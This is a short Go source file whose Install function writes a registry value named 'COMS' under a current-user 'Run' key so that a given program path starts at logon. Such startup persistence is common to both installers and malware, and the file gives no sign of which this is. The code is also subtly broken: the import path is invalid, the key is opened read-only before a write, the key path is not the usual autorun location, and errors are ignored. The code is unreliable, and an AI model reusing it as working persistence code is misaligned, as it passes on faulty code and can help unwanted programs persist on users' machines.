// +build windows

package autorunInstall

import (
	"https://golang.org/x/sys/windows/registry"
	"fmt"
)

func Install(path string) {
	fmt.Println("Windows")
	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Run`, registry.QUERY_VALUE)

	if err != nil {
		fmt.Println(err)
	}

	defer k.Close()

	k.SetStringValue("COMS", path)
}